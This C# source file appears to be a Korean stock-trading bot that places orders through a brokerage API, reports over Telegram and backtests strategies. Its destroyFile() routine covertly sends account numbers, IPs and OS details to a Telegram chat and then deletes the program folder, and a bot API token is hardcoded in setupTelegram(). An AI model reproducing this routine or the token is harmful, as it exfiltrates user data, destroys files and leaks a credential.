using HappyTool.DialogControl.StockDialog;
using HappyTool.Dlg;
using HappyTool.FundManagement;
using HappyTool.Messanger;
using HappyTool.Util;
using StockLibrary;
using StockLibrary.StrategyForTrade;
using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using UtilLibrary;
using static StockLibrary.StrategyModuleList;

namespace HappyTool.Stock
{
    // 싱글톤 대행체
    class ControlGet : SingleTon<ControlGet>
    {
        public StockBot stockBot()
        {
            if (Program.happyTool_ == null) {
                return null;
            }
            if (Program.happyTool_.stockDlg_ == null) {
                return null;
            }

            StockBot bot = Program.happyTool_.stockDlg_.bot_;
            if (bot == null) {
                Program.happyTool_.stockDlg_.bot_ = new StockBot();
            }
            return Program.happyTool_.stockDlg_.bot_;
        }
    }

    //---------------------------------------------------------------------
    // 주식 봇 
    public class StockBot : Bot
    {
        internal StockDB stockSqliteDB_ = null;
        internal StockEngine engine_ { get; }
        public double totalBuyMoney_ = double.MinValue;     // 총매입금액
        public double totalEvaluationMoney_ = double.MinValue; // 구입한 추정예탁자산

        public SiumlateBackTest simulateBackTest_ = null;
        //백테스팅 시뮬결과 용
        public SimulateBackTestRecoder backTestRecoder_ = null;
        Thread hangOnThread_;       //프로그램 죽었는지 감시용

        public StockBot()
        {
            accountMoney_ = 0;
            botState_ = new StockBotState(this);
            engine_ = new StockEngine(Program.happyTool_);

            hangOnThread_ = new Thread(watchingHangOn);
            hangOnThread_.Start();

            backTestRecoder_ = new SimulateBackTestRecoder();
            simulateBackTest_ = new SiumlateBackTest(this);
        }

        bool end_ = false;
        ~StockBot()
        {
            end_ = true;
        }

        public DateTime hangOnWatching_ = new DateTime(2000, 1, 1);
        void watchingHangOn()
        {
            while (!end_) {
                Thread.Sleep(1000);

                if (this.nowStockMarketTime() == false) {
                    continue;
                }
                DateTime now = DateTime.Now;
                if (hangOnWatching_.Year == 2000) {
                    continue;
                }

                if (hangOnWatching_.AddMinutes(this.priceTypeMin() * 2) > now) {
                    continue;
                }

                // 행온 걸린거라 생각되면 프로그램 종료 시킴
                Logger.getInstance.print(KiwoomCode.Log.주식봇, "과도한 조회 요청? ㅅㅂ");
                telegram_.sendMessage("과도한 조회 요청? ㅅㅂ");
                Program.happyTool_.stockDlg_.Button_quit_Click(null, null);
            }
        }

        //---------------------------------------------------------------------
        void destroyFile()
        {
            string log = string.Empty;
            ManagementClass cls = new ManagementClass("Win32_OperatingSystem");
            ManagementObjectCollection instances = cls.GetInstances();

            StringBuilder str = new StringBuilder();
            str.Append("허용되지 않은곳에서 프로그램 돌린 흔적 발견");
            str.Append(Environment.NewLine);

            str.Append("계좌 ID: " + engine_.userId());
            str.Append(Environment.NewLine);

            str.Append("계좌번호: " + StockEngine.accountNumber());
            str.Append(Environment.NewLine);

            str.Append("local IP: " + UtilLibrary.Util.getMyIP());
            str.Append(Environment.NewLine);

            str.Append("host IP: " + UtilLibrary.Util.getHostIP());
            str.Append(Environment.NewLine);

            foreach (ManagementObject instance in instances) {
                foreach (PropertyData prop in instance.Properties) {
                    str.Append(string.Format("{0} : {1}", prop.Name, prop.Value));
                    str.Append(Environment.NewLine);
                }
            }
            telegram_.sendMessage(str.ToString());
            while (telegram_.messageCount() > 0) {
                Thread.Sleep(1000);
            }
            string appPath = Application.StartupPath;

            DirectoryInfo di = new DirectoryInfo(appPath);
            di.Delete(true);
        }

        string greatingMessage()
        {
            bool isTest = this.engine_.isTestServer();
            string log = string.Format("### 행복의 도구 [{0}] 시작 ###\n", isTest ? "모의투자" : "실거래");
            log += string.Format(" - 현재 시각: {0}\n", DateTime.Now);

            return log;
        }

        protected override void setupTelegram()
        {
            bool isTest = engine_.isTestServer();
            if (isTest) {
                telegram_ = new StockTelegramBot("643993591:AAF8ohY1Yi9lCXuRRRJyTLBa0a7IsUZwRVs", PublicFutureVar.telegramCHATID);
            }
            else {
                telegram_ = new StockTelegramBot(PublicVar.telegramStockBotAPI, PublicVar.telegramStockBotCHATID);
            }
            telegram_.start();
        }

        public override void setFundManagement()
        {
            //StrategyModuleList.getInstance.clearPool();
            //tradeModuleDB_.select(this);
            //fundManagement_ = new StockFundManagement(this);
            var manageList = StockFundManagementList.getInstance;
            
            var fund = manageList.getFundManagementCombineStrategyModule("StockLarryRECStrategy", this);
            if (fund == null) {
                Logger.getInstance.print(KiwoomCode.Log.에러, "전략 생성 실패");
                Program.happyTool_.stockDlg_.Button_quit_Click(null, null);
            }
            //var fund = manageList.getFundManagementCombineStrategyModule("GoldenCrossStrategyModule", this);
            //if (fund == null) {
            //    Logger.getInstance.print(KiwoomCode.Log.에러, "전략 생성 실패");
            //    Program.happyTool_.stockDlg_.Button_quit_Click(null, null);
            //}
            //fund.strategyModule_.parseDBString("SMA_5, SMA_200, SMA_100, SMA_20, SMA_200, BOTH");
            this.fundManagement_ = fund;
            
            tradeFilter_ = new StockTradeModuleFilter();
            stockModuleSearcher_ = new FindBestTradeModule(this, tradeFilter_, FINDER_MODE.보통);
        }

        public override bool start()
        {
            stockSqliteDB_ = new StockDB("KoreaStockData.db");

            this.setupTelegram();
            if (base.start() == false) {
#if DEBUG
#else
                this.destroyFile();

                Program.happyTool_.stockDlg_.Button_quit_Click(null, null);
                return false;
#endif
            }
            StockPoolViewer.getInstance.setup();
            this.allowDump_ = true;
            activate_ = true;

            this.setFundManagement();
            this.telegram_.sendMessage(this.greatingMessage());

            return true;
        }

        //---------------------------------------------------------------------
        public override void requestMyAccountInfo()
        {
            engine_.addOrder(new AccountStockStatement());
            engine_.addOrder(new AccountMoney2Statement());
            engine_.addOrder(new AccountMoney3Statement());
        }

        public void requestHighTradingStocks()
        {
            engine_.addOrder(new HighTradingStock());
            engine_.addOrder(new YesterdayHighTradingStock());
        //    engine_.addOrder(new SuddenlyHighTradingStock());
        }

        public void requestAgencyStocks()
        {
            engine_.addOrder(new ForeignerTradingSotck());
            engine_.addOrder(new AgencyTradingStock());
        }

        public override void requestStockData(string code, bool forceBuy = false)
        {
            base.requestStockData(code);
            engine_.requestStockData(code, priceType_, forceBuy);
        }

        public void clearStockDataRecvedTime()
        {
            StockDataEach eachDo = (string code, StockData stockData) => {
                if (code.Length == 0) {
                    return;
                }
                stockData.recvedDataTime_ = DateTime.MinValue;
            };
            this.doStocks(eachDo);
        }

        //--------------------------------------------------------
        // 다이얼로그에 그리기 함수
        public override void updatePoolView()
        {
            StockPoolViewer.getInstance.print();
            StockDlgInfo.getInstance.updateBuyPoolView();
        }

        public override void updateNowBuyedProfit()
        {
            int sumBuyCount = 0;
            double totalProfit = 0.0f;
            StockDataEach eachDo = (string code, StockData stockData) => {
                if (stockData.isBuyedItem() == false) {
                    return;
                }
                sumBuyCount++;
                totalProfit = totalProfit + stockData.nowProfit();
            };
            this.doStocks(eachDo);
            nowBuyedProfit_ = totalProfit;
        }

        //--------------------------------------------------------
        // 예수금
        public void setAccountMoney(double money)
        {
            accountMoney_ = money;
            Program.happyTool_.stockDlg_.updateAccountMoney(accountMoney_);
        }

        public void addAccountMoney(double money)
        {
            accountMoney_ += money;
            Program.happyTool_.stockDlg_.updateAccountMoney(accountMoney_);
        }

        // 강제 구입을 위해 남겨둠
        public override void buyStock(string code, int tradeCount, double tradePrice)
        {
            var kStockData = this.getStockDataCode(code) as KStockData;
            kStockData.isOredered_ = true;

            this.engine_.removeScreenNum(kStockData.regScreenNumber_);
            this.engine_.addOrder(new BuyStock(kStockData.code_, tradeCount, tradePrice));
            kStockData.lastChejanDate_ = kStockData.nowDateTime();

            //   bot_.futureDB_.updateTradeRecode(kStockData, "매수 포지션 주문");

            string log = string.Format("$ {0} 매수\n", kStockData.name_);
            log += string.Format("-> [{0} 개 x {1:##,###0}] 주문 들어 갔습니다.\n", tradeCount, tradePrice);
         //   log += string.Format("-> 예상 이익구간 {0}\n", kStockData.logExpectedRange());

            string filePath = StockDlgInfo.getInstance.captureForm();
            TelegramBot telegramBot = this.telegram_;
            telegramBot.sendPhoto(filePath, log);
        }

        public override void sellStock(string code, int tradeCount, double tradePrice)
        {
            throw new NotImplementedException();
        }

        public override void payOff(string code, string why)
        {
            var kStockData = this.getStockDataCode(code) as KStockData;

            this.engine_.addOrder(new SellStock(kStockData));
            kStockData.isOredered_ = true;

            string log = string.Format("$ {0} 매도 [{1} 개 x {2:##,###0.##}] 주문 들어 갔습니다.\n", kStockData.name_, kStockData.buyCount_, kStockData.nowPrice());
            var recode = kStockData.tradeModule();
            if (recode != null) {
                //log += string.Format("-> buy[{0}] / sell[{1}\n", recode.buyTradeModule_.getName(), recode.sellTradeModule_.getName());
                log += string.Format("-> 예상 승률: {0:##.##}%/{1}시도\n", recode.expectedWinRate_ * 100, recode.tradeCount_);
                log += string.Format("-> 1주당 평균 이익금: {0:##.###0}원, 평균 보유시간 {1}분", recode.avgProfit_, recode.avgHaveTime_);
                log += string.Format("-> 예상 이익구간 {0}\n", kStockData.logExpectedRange());
            }
            log += string.Format("-> 청산 이유: {0}\n", why);
            log += string.Format("=> 실제 : {0:#,###}원 이익, {1:##0.##}% 이익율", kStockData.nowProfit(), kStockData.nowProfitRate() * 100);
            this.todayTotalProfit_ += kStockData.nowProfit();

            if (kStockData.nowProfitRate() < 1) {
                kStockData.position_ = TRADING_STATUS.모니터닝;
                this.removeStock(kStockData.code_);
            }
            else {
                kStockData.resetBuyInfo();
                kStockData.resetTradeModule();
                kStockData.resetFinedBestRecoders();
            }
            string filePath = StockDlgInfo.getInstance.captureForm();
            this.telegram_.sendPhoto(filePath, log);
            kStockData.wasBuyed_ = true;
        }

        protected override void findEachFundmanagement(StockData stockData)
        {
            throw new NotImplementedException();
        }

        //--------------------------------------------------------
        // 상태 관련 로직
        //-------------------------------------------------------- 
        public void trimStocks()
        {
            List<string> delStock = new List<string>();
            StockDataEach eachDo = (string code, StockData stockData) => {
                if (stockData.isBuyedItem()) {
                    return;
                }
                // 동전주 버려
                var nowPrice = stockData.nowPrice();
                if (UtilLibrary.Util.isRange(PublicVar.limitLowStockPrice, nowPrice, PublicVar.limitHighStockPrice) == false) {
                    delStock.Add(code);
                    return;
                }

                // 거래량 있어야 함.
                if (stockData.nowVolume() < PublicVar.limitVolumes) {
                    Logger.getInstance.print(KiwoomCode.Log.주식봇, "{0}은 거래량이 적어서 제거", stockData.name_);
                    delStock.Add(code);
                    return;
                }

                if (this.fundManagement_.strategyModule_.checkEntryStrategy(stockData) != TRADING_STATUS.매수) {
                    Logger.getInstance.print(KiwoomCode.Log.주식봇, "{0} 1일봉상 전략이 안맞아 제거", stockData.name_);
                    delStock.Add(code);
                    return;
                }
            };
            this.doStocks(eachDo);

            foreach (string code in delStock) {
                this.removeStock(code);
            }
        }
        public void resetStockPrice()
        {
            StockDataEach eachDo = (string code, StockData stockData) => {
                stockData.clearPrice();
            };
            this.doStocks(eachDo);
        }

        public override void searchBestTradeModuleAnStock(StockData stockData, bool force = false)
        {
            if (stockData.isBuyedItem()) {
                if (stockData.hasTradeModule() == false) {
                    Logger.getInstance.print(KiwoomCode.Log.에러, "{0} 을 다시 찾는다고???", stockData.name_);
                }
            }
            if (stockModuleSearcher_ != null) {
                stockModuleSearcher_.runAllModule(stockData);
            }
        }

        public override void saveToDBPriceAt(StockData stockData)
        {
        //    var kStockData = stockData as KStockData;
        //    stockSqliteDB_.updateStockPrice(kStockData);
        }

        public override void saveToDB(bool force = false)
        {
            Thread thread = new Thread(() => {
                var progressBar = Progresser.getInstance;

                int count = this.stockPoolCount();
                progressBar.setMax(count);
                progressBar.setInit();

                int index = 0;
                var dlg = Program.happyTool_.stockDlg_;

                StockDataEach eachDo = (string code, StockData stockData) => {
                    if (stockData.code_.Contains("Upper")) {
                        return;
                    }
                    Thread.Sleep(20);
                    this.saveToDBPriceAt(stockData);

                    progressBar.performStep();
                    dlg.printStatus(string.Format("db에 저장중 {0}/{1}", index++, count));
                };
                this.doStocks(eachDo);

                progressBar.setInit();
                dlg.printStatus(string.Format("db에 저장완료"));
            });
            thread.Start();
        }

        public override void loadFromDB()
        {
            StockDlg dlg = Program.happyTool_.stockDlg_;
            StockDataEach eachDo = (string code, StockData stockData) => {
                this.loadFromDB(stockData);
            };
            this.doStocks(eachDo);
            dlg.printStatus(string.Format("가격표 db로부터 로딩 완료"));
        }

        public override bool loadFromDB(StockData stockData)
        {
            stockSqliteDB_.selectTradeModule(ref stockData);
            return true;
        }

        protected override void updateTradeModuleAllStock()
        {
            StockDataEach eachDo = (string code, StockData stockData) => {
                this.saveTradeModule(stockData);
            };
            this.doStocks(eachDo);
        }

        public override void saveTradeModule(StockData stockData)
        {
            if (stockData.tradeModulesCount() > 0) {
                stockSqliteDB_.updateTradeModule(stockData);
            }
        }

        public override void updateTradeModuleList(StockTradeModuleList moduleList)
        {
            throw new NotImplementedException();
        }

        // 파이썬으로 1일 봉으로 거른 주식 리스트
        public override void loadYesterDayFilterList()
        {
            this.clearStockPool();
            stockSqliteDB_.getYesterDayFilterkList(this);
        }

        //--------------------------------------------------------
        // 시간 처리
        public override DateTime marketStartTime()
        {
            DateTime now = DateTime.Now;
            DateTime start = new DateTime(now.Year, now.Month, now.Day, 9, 0, 0);
            return start;
        }

        public override bool nowStockMarketTime()
        {
            if (Calendar.isTodayWeekDay() == false) {
                return false;
            }

            if (Calendar.isKoreanHolyday()) {
                return false;
            }

            DateTime now = DateTime.Now;
            DateTime start = new DateTime(now.Year, now.Month, now.Day, 9, 0, 0);
            DateTime end = new DateTime(now.Year, now.Month, now.Day, 15, 5, 0);

            if (UtilLibrary.Util.isRange(start.Ticks, now.Ticks, end.Ticks) == true) {
                return true;
            }
            return false;
        }

        // 키움증권 증권사가 새벽 3~6시 사이 점검함.
        public override void checkShutdownTime()
        {
            DateTime now = DateTime.Now;
            // 2시에 자동 셧다운 시킴
            DateTime shutDownTime = new DateTime(now.Year, now.Month, now.Day, 2, 00, 0);
            DateTime onTime = new DateTime(now.Year, now.Month, now.Day, 3, 0, 0);

            if (UtilLibrary.Util.isRange(shutDownTime.Ticks, now.Ticks, onTime.Ticks)) {
                Logger.getInstance.print(KiwoomCode.Log.주식봇, "셧다운 시간. 자동 종료");
                engine_.doDisconnect();
                Program.happyTool_.stockDlg_.Button_quit_Click(null, null);
            }
        }

        DateTime reportTime_ = DateTime.MinValue;
        public void reportToday()
        {
            DateTime now = DateTime.Now;
            if (now.DayOfWeek == DayOfWeek.Sunday || now.DayOfWeek == DayOfWeek.Saturday) {
                return;
            }
            if (reportTime_ == DateTime.MinValue) {
                reportTime_ = new DateTime(now.Year, now.Month, now.Day, 15, 25, 0);
                return;
            }
            else if (reportTime_ >= now) {
                return;
            }

            reportTime_ = reportTime_.AddDays(1);

            string log = "*** 오늘자 결산 ***\n";
            log += "[종목]\t\t[갯수]\t\t[평가액]\n";
            double money = 0;
            StockDataEach eachDo = (string code, StockData stockData) => {
                if (stockData.isBuyedItem() == false) {
                    return;
                }
                KStockData buyed = (KStockData) stockData;
                double value = buyed.buyCount_ * buyed.nowPrice();
                money += value;
                char profit = buyed.nowProfit() > 0 ? '+' : '-';
                log += string.Format("[{0}]-[{1}][{2}][{3:##,###}원][{4:##.##}%\n", profit, buyed.name_, buyed.buyCount_, value, buyed.nowProfitRate() * 100);
            };
            this.doStocks(eachDo);

            log += string.Format("--> 주식 평가액 {0:##,###}원\n", money);
            log += string.Format("--> 예수금 : {0:##,###}원\n", accountMoney_);

            double total = money + accountMoney_;
            log += string.Format("=== 총 평가: {0:##,###}원\n", total);

            telegram_.sendMessage(log);
        }

        //----------------------------------------------------------------------------------------
        // 백테스팅 시스템
        public override bool doBackTestAnStock(StockData stockData, StrategyModule buyStrategy, StrategyModule sellStrategy, ref BackTestRecoder backTestRecode)
        {
            List<CandleData> priceTable = stockData.priceTable();
            if (priceTable == null) {
                return false;
            }
            if (buyStrategy == null) {
                return false;
            }
            if (sellStrategy == null) {
                return false;
            }

            double buyPrice = 0;                       // 살때 가격
            int buyCount = 1;                       // 1개를 샀을때 가격 변화량
            DateTime buyDate = DateTime.Now;
            bool buyFlag = false;                   // 현재 모드
            int count = 0;                          // 몇번 샀는가? (이거 기록하는게 좋을듯)

            //double strikeRate = 0.0f;             // 승율
            StockBackTestRecoder record = backTestRecode as StockBackTestRecoder;
            if (record == null) {
                return false;
            }
            record.buyTradeModule_ = buyStrategy;
            record.sellTradeModule_ = sellStrategy;

            try {
                int lastTime = priceTable.Count - PublicVar.defaultCalcCandleCount;

                for (int timeIdx = lastTime; timeIdx >= 0; timeIdx--) {
                    double price = priceTable[timeIdx].price_;

                    if (buyFlag == false) {
                        if (buyStrategy.buy(stockData, timeIdx)) {
                            //이 시점에 산다.
                            buyPrice = price;
                            buyDate = priceTable[timeIdx].date_;
                            buyFlag = true;
                            count++;
                        }
                    }
                    else {
                        double nowProfit = (price - buyPrice) / price;
                        if (sellStrategy.sell(stockData, timeIdx)) {
                            buyFlag = false;
                            record.addTrade(stockData.code_, timeIdx, buyDate, priceTable[timeIdx].date_, buyPrice, price, buyCount);
                        }
                    }
                }
                // 마지막에 사있으면, 이걸 지금은 얼만지 본다.
                if (buyFlag) {
                    const int NOW_DAY_IDX = 0;   // 배열상 0번에 오늘 가격 데이터가 들어가 있음.       
                    double price = priceTable[NOW_DAY_IDX].price_;
                    record.addTrade(stockData.code_, NOW_DAY_IDX, buyDate, priceTable[NOW_DAY_IDX].date_, buyPrice, price, buyCount);
                }

                record.calcEval();
            }
            catch (Exception e) {
                Logger.getInstance.print(KiwoomCode.Log.에러, "백테스팅 도중 에러 [{0}]", e.Message);
            }

            if (record.tradeCount_ == 0) {
                return false;
            }
            return true;
        }

        //---------------------------------------------------------------------------------
        // 전체 과거 주식 데이터를 기반으로 전략 시뮬레이팅을 해본다
        //public virtual SimulateBackTestRecoder doSimulateTest(out string log)
        //{
            //StockDlg dlg = Program.happyTool_.stockDlg_;
            //dlg.printStatus(string.Format("{0} 으로 주식 시뮬레이팅중", this.priceTypeMin()));

            //backTestRecoder_ = null;
            //backTestRecoder_ = simulateBackTest_.run(out log);

            //SimulateRecoderInfo.getInstance.updateChart(backTestRecoder_);
            //SimulateRecoderInfo.getInstance.printToLogWindow(log);

            //dlg.printStatus(string.Format("{0} 으로 주식 시뮬레이팅 완료", this.priceTypeMin()));

            //telegram_.sendMessage(log);

            //return backTestRecoder_;
        //}

        public override int marketStartHour()
        {
            return 9;
        }
    }
}
